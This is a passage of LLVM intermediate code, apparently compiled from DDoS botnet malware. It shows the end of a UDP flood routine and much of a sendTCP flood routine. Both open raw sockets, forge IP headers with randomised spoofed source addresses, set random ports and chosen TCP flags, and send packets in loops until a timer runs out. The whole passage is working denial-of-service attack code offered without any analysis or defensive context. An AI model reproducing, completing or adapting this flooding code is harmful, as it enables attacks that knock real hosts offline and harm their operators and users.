
; <label>:41:                                     ; preds = %8
  %42 = load i32, i32* %10, align 4
  %43 = trunc i32 %42 to i16
  %44 = call zeroext i16 @htons(i16 zeroext %43) #13
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  br label %46

; <label>:46:                                     ; preds = %41, %37
  %47 = load i8*, i8** %9, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %289

; <label>:52:                                     ; preds = %46
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %14, align 4
  store i32 %55, i32* %18, align 4
  %56 = load i32, i32* %12, align 4
  %57 = icmp eq i32 %56, 32
  br i1 %57, label %58, label %118

; <label>:58:                                     ; preds = %52
  %59 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %59, i32* %19, align 4
  %60 = load i32, i32* %19, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %63, label %62

; <label>:62:                                     ; preds = %58
  br label %289

; <label>:63:                                     ; preds = %58
  %64 = load i32, i32* %13, align 4
  %65 = add nsw i32 %64, 1
  %66 = sext i32 %65 to i64
  %67 = call noalias i8* @malloc(i64 %66) #2
  store i8* %67, i8** %20, align 8
  %68 = load i8*, i8** %20, align 8
  %69 = icmp eq i8* %68, null
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %63
  br label %289

; <label>:71:                                     ; preds = %63
  %72 = load i8*, i8** %20, align 8
  %73 = load i32, i32* %13, align 4
  %74 = add nsw i32 %73, 1
  %75 = sext i32 %74 to i64
  call void @llvm.memset.p0i8.i64(i8* %72, i8 0, i64 %75, i32 1, i1 false)
  %76 = load i8*, i8** %20, align 8
  %77 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %76, i32 %77)
  %78 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %79 = load i32, i32* %11, align 4
  %80 = add nsw i32 %78, %79
  store i32 %80, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %81

; <label>:81:                                     ; preds = %114, %110, %103, %71
  %82 = load i32, i32* %19, align 4
  %83 = load i8*, i8** %20, align 8
  %84 = load i32, i32* %13, align 4
  %85 = sext i32 %84 to i64
  %86 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %87 = call i64 @sendto(i32 %82, i8* %83, i64 %85, i32 0, %struct.sockaddr* %86, i32 16)
  %88 = load i32, i32* %22, align 4
  %89 = load i32, i32* %18, align 4
  %90 = icmp eq i32 %88, %89
  br i1 %90, label %91, label %104

; <label>:91:                                     ; preds = %81
  %92 = load i32, i32* %10, align 4
  %93 = icmp eq i32 %92, 0
  br i1 %93, label %94, label %98

; <label>:94:                                     ; preds = %91
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  %97 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %96, i16* %97, align 2
  br label %98

; <label>:98:                                     ; preds = %94, %91
  %99 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %100 = load i32, i32* %21, align 4
  %101 = icmp sgt i32 %99, %100
  br i1 %101, label %102, label %103

; <label>:102:                                    ; preds = %98
  br label %117

; <label>:103:                                    ; preds = %98
  store i32 0, i32* %22, align 4
  br label %81

; <label>:104:                                    ; preds = %81
  %105 = load i32, i32* %22, align 4
  %106 = add i32 %105, 1
  store i32 %106, i32* %22, align 4
  %107 = load i32, i32* %23, align 4
  %108 = load i32, i32* %15, align 4
  %109 = icmp eq i32 %107, %108
  br i1 %109, label %110, label %114

; <label>:110:                                    ; preds = %104
  %111 = load i32, i32* %16, align 4
  %112 = mul nsw i32 %111, 1000
  %113 = call i32 @usleep(i32 %112)
  store i32 0, i32* %23, align 4
  br label %81

; <label>:114:                                    ; preds = %104
  %115 = load i32, i32* %23, align 4
  %116 = add i32 %115, 1
  store i32 %116, i32* %23, align 4
  br label %81

; <label>:117:                                    ; preds = %102
  br label %289

; <label>:118:                                    ; preds = %52
  %119 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %119, i32* %24, align 4
  %120 = load i32, i32* %24, align 4
  %121 = icmp ne i32 %120, 0
  br i1 %121, label %123, label %122

; <label>:122:                                    ; preds = %118
  br label %289

; <label>:123:                                    ; preds = %118
  store i32 1, i32* %25, align 4
  %124 = load i32, i32* %24, align 4
  %125 = bitcast i32* %25 to i8*
  %126 = call i32 @setsockopt(i32 %124, i32 0, i32 3, i8* %125, i32 4) #2
  %127 = icmp slt i32 %126, 0
  br i1 %127, label %128, label %129

; <label>:128:                                    ; preds = %123
  br label %289

; <label>:129:                                    ; preds = %123
  store i32 50, i32* %26, align 4
  br label %130

; <label>:130:                                    ; preds = %134, %129
  %131 = load i32, i32* %26, align 4
  %132 = add nsw i32 %131, -1
  store i32 %132, i32* %26, align 4
  %133 = icmp ne i32 %131, 0
  br i1 %133, label %134, label %139

; <label>:134:                                    ; preds = %130
  %135 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %136 = call i32 @rand_cmwc()
  %137 = xor i32 %135, %136
  call void @srand(i32 %137) #2
  %138 = call i32 @rand() #2
  call void @init_rand(i32 %138)
  br label %130

; <label>:139:                                    ; preds = %130
  %140 = load i32, i32* %12, align 4
  %141 = icmp eq i32 %140, 0
  br i1 %141, label %142, label %143

; <label>:142:                                    ; preds = %139
  store i32 0, i32* %27, align 4
  br label %149

; <label>:143:                                    ; preds = %139
  %144 = load i32, i32* %12, align 4
  %145 = sub nsw i32 32, %144
  %146 = shl i32 1, %145
  %147 = sub nsw i32 %146, 1
  %148 = xor i32 %147, -1
  store i32 %148, i32* %27, align 4
  br label %149

; <label>:149:                                    ; preds = %143, %142
  %150 = load i32, i32* %13, align 4
  %151 = sext i32 %150 to i64
  %152 = add i64 28, %151
  %153 = call i8* @llvm.stacksave()
  store i8* %153, i8** %28, align 8
  %154 = alloca i8, i64 %152, align 16
  %155 = bitcast i8* %154 to %struct.iphdr*
  store %struct.iphdr* %155, %struct.iphdr** %29, align 8
  %156 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %157 = bitcast %struct.iphdr* %156 to i8*
  %158 = getelementptr i8, i8* %157, i64 20
  %159 = bitcast i8* %158 to %struct.udphdr*
  store %struct.udphdr* %159, %struct.udphdr** %30, align 8
  %160 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %161 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %162 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %161, i32 0, i32 0
  %163 = load i32, i32* %162, align 4
  %164 = load i32, i32* %27, align 4
  %165 = call i32 @GetRandomIP(i32 %164)
  %166 = call i32 @htonl(i32 %165) #13
  %167 = load i32, i32* %13, align 4
  %168 = sext i32 %167 to i64
  %169 = add i64 8, %168
  %170 = trunc i64 %169 to i32
  call void @makeIPPacket(%struct.iphdr* %160, i32 %163, i32 %166, i8 zeroext 17, i32 %170)
  %171 = load i32, i32* %13, align 4
  %172 = sext i32 %171 to i64
  %173 = add i64 8, %172
  %174 = trunc i64 %173 to i16
  %175 = call zeroext i16 @htons(i16 zeroext %174) #13
  %176 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %177 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %176, i32 0, i32 0
  %178 = bitcast %union.anon.2* %177 to %struct.anon.3*
  %179 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %178, i32 0, i32 2
  store i16 %175, i16* %179, align 2
  %180 = call i32 @rand_cmwc()
  %181 = trunc i32 %180 to i16
  %182 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %183 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %182, i32 0, i32 0
  %184 = bitcast %union.anon.2* %183 to %struct.anon.3*
  %185 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %184, i32 0, i32 0
  store i16 %181, i16* %185, align 2
  %186 = load i32, i32* %10, align 4
  %187 = icmp eq i32 %186, 0
  br i1 %187, label %188, label %190

; <label>:188:                                    ; preds = %149
  %189 = call i32 @rand_cmwc()
  br label %195

; <label>:190:                                    ; preds = %149
  %191 = load i32, i32* %10, align 4
  %192 = trunc i32 %191 to i16
  %193 = call zeroext i16 @htons(i16 zeroext %192) #13
  %194 = zext i16 %193 to i32
  br label %195

; <label>:195:                                    ; preds = %190, %188
  %196 = phi i32 [ %189, %188 ], [ %194, %190 ]
  %197 = trunc i32 %196 to i16
  %198 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %199 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %198, i32 0, i32 0
  %200 = bitcast %union.anon.2* %199 to %struct.anon.3*
  %201 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %200, i32 0, i32 1
  store i16 %197, i16* %201, align 2
  %202 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %203 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %202, i32 0, i32 0
  %204 = bitcast %union.anon.2* %203 to %struct.anon.3*
  %205 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %204, i32 0, i32 3
  store i16 0, i16* %205, align 2
  %206 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %207 = bitcast %struct.udphdr* %206 to i8*
  %208 = getelementptr inbounds i8, i8* %207, i64 8
  %209 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %208, i32 %209)
  %210 = bitcast i8* %154 to i16*
  %211 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 2
  %213 = load i16, i16* %212, align 2
  %214 = zext i16 %213 to i32
  %215 = call zeroext i16 @csum(i16* %210, i32 %214)
  %216 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 7
  store i16 %215, i16* %217, align 2
  %218 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %219 = load i32, i32* %11, align 4
  %220 = add nsw i32 %218, %219
  store i32 %220, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %221

; <label>:221:                                    ; preds = %284, %280, %273, %195
  br label %222

; <label>:222:                                    ; preds = %221
  %223 = load i32, i32* %24, align 4
  %224 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %225 = call i64 @sendto(i32 %223, i8* %154, i64 %152, i32 0, %struct.sockaddr* %224, i32 16)
  %226 = call i32 @rand_cmwc()
  %227 = trunc i32 %226 to i16
  %228 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %229 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %228, i32 0, i32 0
  %230 = bitcast %union.anon.2* %229 to %struct.anon.3*
  %231 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %230, i32 0, i32 0
  store i16 %227, i16* %231, align 2
  %232 = load i32, i32* %10, align 4
  %233 = icmp eq i32 %232, 0
  br i1 %233, label %234, label %236

; <label>:234:                                    ; preds = %222
  %235 = call i32 @rand_cmwc()
  br label %241

; <label>:236:                                    ; preds = %222
  %237 = load i32, i32* %10, align 4
  %238 = trunc i32 %237 to i16
  %239 = call zeroext i16 @htons(i16 zeroext %238) #13
  %240 = zext i16 %239 to i32
  br label %241

; <label>:241:                                    ; preds = %236, %234
  %242 = phi i32 [ %235, %234 ], [ %240, %236 ]
  %243 = trunc i32 %242 to i16
  %244 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %245 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %244, i32 0, i32 0
  %246 = bitcast %union.anon.2* %245 to %struct.anon.3*
  %247 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %246, i32 0, i32 1
  store i16 %243, i16* %247, align 2
  %248 = call i32 @rand_cmwc()
  %249 = trunc i32 %248 to i16
  %250 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i32 0, i32 3
  store i16 %249, i16* %251, align 4
  %252 = load i32, i32* %27, align 4
  %253 = call i32 @GetRandomIP(i32 %252)
  %254 = call i32 @htonl(i32 %253) #13
  %255 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i32 0, i32 8
  store i32 %254, i32* %256, align 4
  %257 = bitcast i8* %154 to i16*
  %258 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 2
  %260 = load i16, i16* %259, align 2
  %261 = zext i16 %260 to i32
  %262 = call zeroext i16 @csum(i16* %257, i32 %261)
  %263 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 7
  store i16 %262, i16* %264, align 2
  %265 = load i32, i32* %32, align 4
  %266 = load i32, i32* %18, align 4
  %267 = icmp eq i32 %265, %266
  br i1 %267, label %268, label %274

; <label>:268:                                    ; preds = %241
  %269 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %270 = load i32, i32* %31, align 4
  %271 = icmp sgt i32 %269, %270
  br i1 %271, label %272, label %273

; <label>:272:                                    ; preds = %268
  br label %287

; <label>:273:                                    ; preds = %268
  store i32 0, i32* %32, align 4
  br label %221

; <label>:274:                                    ; preds = %241
  %275 = load i32, i32* %32, align 4
  %276 = add i32 %275, 1
  store i32 %276, i32* %32, align 4
  %277 = load i32, i32* %33, align 4
  %278 = load i32, i32* %15, align 4
  %279 = icmp eq i32 %277, %278
  br i1 %279, label %280, label %284

; <label>:280:                                    ; preds = %274
  %281 = load i32, i32* %16, align 4
  %282 = mul nsw i32 %281, 1000
  %283 = call i32 @usleep(i32 %282)
  store i32 0, i32* %33, align 4
  br label %221

; <label>:284:                                    ; preds = %274
  %285 = load i32, i32* %33, align 4
  %286 = add i32 %285, 1
  store i32 %286, i32* %33, align 4
  br label %221

; <label>:287:                                    ; preds = %272
  %288 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %288)
  br label %289

; <label>:289:                                    ; preds = %287, %128, %122, %117, %70, %62, %51
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

declare i32 @usleep(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %332

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %45
  br label %332

; <label>:52:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %53 = load i32, i32* %17, align 4
  %54 = bitcast i32* %18 to i8*
  %55 = call i32 @setsockopt(i32 %53, i32 0, i32 3, i8* %54, i32 4) #2
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  br label %332

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %11, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  store i32 0, i32* %19, align 4
  br label %68

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %11, align 4
  %64 = sub nsw i32 32, %63
  %65 = shl i32 1, %64
  %66 = sub nsw i32 %65, 1
  %67 = xor i32 %66, -1
  store i32 %67, i32* %19, align 4
  br label %68

; <label>:68:                                     ; preds = %62, %61
  %69 = load i32, i32* %13, align 4
  %70 = sext i32 %69 to i64
  %71 = add i64 40, %70
  %72 = call i8* @llvm.stacksave()
  store i8* %72, i8** %20, align 8
  %73 = alloca i8, i64 %71, align 16
  %74 = bitcast i8* %73 to %struct.iphdr*
  store %struct.iphdr* %74, %struct.iphdr** %21, align 8
  %75 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %76 = bitcast %struct.iphdr* %75 to i8*
  %77 = getelementptr i8, i8* %76, i64 20
  %78 = bitcast i8* %77 to %struct.tcphdr*
  store %struct.tcphdr* %78, %struct.tcphdr** %22, align 8
  %79 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %81 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 4
  %83 = load i32, i32* %19, align 4
  %84 = call i32 @GetRandomIP(i32 %83)
  %85 = call i32 @htonl(i32 %84) #13
  %86 = load i32, i32* %13, align 4
  %87 = sext i32 %86 to i64
  %88 = add i64 20, %87
  %89 = trunc i64 %88 to i32
  call void @makeIPPacket(%struct.iphdr* %79, i32 %82, i32 %85, i8 zeroext 6, i32 %89)
  %90 = call i32 @rand_cmwc()
  %91 = trunc i32 %90 to i16
  %92 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %93 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %92, i32 0, i32 0
  %94 = bitcast %union.anon.0* %93 to %struct.anon.1*
  %95 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %94, i32 0, i32 0
  store i16 %91, i16* %95, align 4
  %96 = call i32 @rand_cmwc()
  %97 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon.0* %98 to %struct.anon.1*
  %100 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %99, i32 0, i32 2
  store i32 %96, i32* %100, align 4
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 3
  store i32 0, i32* %104, align 4
  %105 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %106 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon.0* %106 to %struct.anon.1*
  %108 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %107, i32 0, i32 4
  %109 = load i16, i16* %108, align 4
  %110 = and i16 %109, -241
  %111 = or i16 %110, 80
  store i16 %111, i16* %108, align 4
  %112 = load i8*, i8** %12, align 8
  %113 = call i32 @strcmp(i8* %112, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.388, i32 0, i32 0)) #10
  %114 = icmp ne i32 %113, 0
  br i1 %114, label %151, label %115

; <label>:115:                                    ; preds = %68
  %116 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %117 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %116, i32 0, i32 0
  %118 = bitcast %union.anon.0* %117 to %struct.anon.1*
  %119 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %118, i32 0, i32 4
  %120 = load i16, i16* %119, align 4
  %121 = and i16 %120, -513
  %122 = or i16 %121, 512
  store i16 %122, i16* %119, align 4
  %123 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %124 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %123, i32 0, i32 0
  %125 = bitcast %union.anon.0* %124 to %struct.anon.1*
  %126 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %125, i32 0, i32 4
  %127 = load i16, i16* %126, align 4
  %128 = and i16 %127, -1025
  %129 = or i16 %128, 1024
  store i16 %129, i16* %126, align 4
  %130 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %131 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %130, i32 0, i32 0
  %132 = bitcast %union.anon.0* %131 to %struct.anon.1*
  %133 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %132, i32 0, i32 4
  %134 = load i16, i16* %133, align 4
  %135 = and i16 %134, -257
  %136 = or i16 %135, 256
  store i16 %136, i16* %133, align 4
  %137 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %138 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %137, i32 0, i32 0
  %139 = bitcast %union.anon.0* %138 to %struct.anon.1*
  %140 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %139, i32 0, i32 4
  %141 = load i16, i16* %140, align 4
  %142 = and i16 %141, -4097
  %143 = or i16 %142, 4096
  store i16 %143, i16* %140, align 4
  %144 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i32 0, i32 0
  %146 = bitcast %union.anon.0* %145 to %struct.anon.1*
  %147 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %146, i32 0, i32 4
  %148 = load i16, i16* %147, align 4
  %149 = and i16 %148, -2049
  %150 = or i16 %149, 2048
  store i16 %150, i16* %147, align 4
  br label %225

; <label>:151:                                    ; preds = %68
  %152 = load i8*, i8** %12, align 8
  %153 = call i8* @strtok(i8* %152, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %153, i8** %23, align 8
  br label %154

; <label>:154:                                    ; preds = %222, %151
  %155 = load i8*, i8** %23, align 8
  %156 = icmp ne i8* %155, null
  br i1 %156, label %157, label %224

; <label>:157:                                    ; preds = %154
  %158 = load i8*, i8** %23, align 8
  %159 = call i32 @strcmp(i8* %158, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.390, i32 0, i32 0)) #10
  %160 = icmp ne i32 %159, 0
  br i1 %160, label %169, label %161

; <label>:161:                                    ; preds = %157
  %162 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %163 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %162, i32 0, i32 0
  %164 = bitcast %union.anon.0* %163 to %struct.anon.1*
  %165 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %164, i32 0, i32 4
  %166 = load i16, i16* %165, align 4
  %167 = and i16 %166, -513
  %168 = or i16 %167, 512
  store i16 %168, i16* %165, align 4
  br label %222

; <label>:169:                                    ; preds = %157
  %170 = load i8*, i8** %23, align 8
  %171 = call i32 @strcmp(i8* %170, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.391, i32 0, i32 0)) #10
  %172 = icmp ne i32 %171, 0
  br i1 %172, label %181, label %173

; <label>:173:                                    ; preds = %169
  %174 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = bitcast %union.anon.0* %175 to %struct.anon.1*
  %177 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -1025
  %180 = or i16 %179, 1024
  store i16 %180, i16* %177, align 4
  br label %221

; <label>:181:                                    ; preds = %169
  %182 = load i8*, i8** %23, align 8
  %183 = call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.392, i32 0, i32 0)) #10
  %184 = icmp ne i32 %183, 0
  br i1 %184, label %193, label %185

; <label>:185:                                    ; preds = %181
  %186 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %186, i32 0, i32 0
  %188 = bitcast %union.anon.0* %187 to %struct.anon.1*
  %189 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %188, i32 0, i32 4
  %190 = load i16, i16* %189, align 4
  %191 = and i16 %190, -257
  %192 = or i16 %191, 256
  store i16 %192, i16* %189, align 4
  br label %220

; <label>:193:                                    ; preds = %181
  %194 = load i8*, i8** %23, align 8
  %195 = call i32 @strcmp(i8* %194, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.393, i32 0, i32 0)) #10
  %196 = icmp ne i32 %195, 0
  br i1 %196, label %205, label %197

; <label>:197:                                    ; preds = %193
  %198 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 0
  %200 = bitcast %union.anon.0* %199 to %struct.anon.1*
  %201 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %200, i32 0, i32 4
  %202 = load i16, i16* %201, align 4
  %203 = and i16 %202, -4097
  %204 = or i16 %203, 4096
  store i16 %204, i16* %201, align 4
  br label %219

; <label>:205:                                    ; preds = %193
  %206 = load i8*, i8** %23, align 8
  %207 = call i32 @strcmp(i8* %206, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.394, i32 0, i32 0)) #10
  %208 = icmp ne i32 %207, 0
  br i1 %208, label %217, label %209

; <label>:209:                                    ; preds = %205
  %210 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %211 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %210, i32 0, i32 0
  %212 = bitcast %union.anon.0* %211 to %struct.anon.1*
  %213 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %212, i32 0, i32 4
  %214 = load i16, i16* %213, align 4
  %215 = and i16 %214, -2049
  %216 = or i16 %215, 2048
  store i16 %216, i16* %213, align 4
  br label %218

; <label>:217:                                    ; preds = %205
  br label %218

; <label>:218:                                    ; preds = %217, %209
  br label %219

; <label>:219:                                    ; preds = %218, %197
  br label %220

; <label>:220:                                    ; preds = %219, %185
  br label %221

; <label>:221:                                    ; preds = %220, %173
  br label %222

; <label>:222:                                    ; preds = %221, %161
  %223 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %223, i8** %23, align 8
  br label %154

; <label>:224:                                    ; preds = %154
  br label %225

; <label>:225:                                    ; preds = %224, %115
  %226 = call i32 @rand_cmwc()
  %227 = trunc i32 %226 to i16
  %228 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 0
  %230 = bitcast %union.anon.0* %229 to %struct.anon.1*
  %231 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %230, i32 0, i32 5
  store i16 %227, i16* %231, align 2
  %232 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 0
  %234 = bitcast %union.anon.0* %233 to %struct.anon.1*
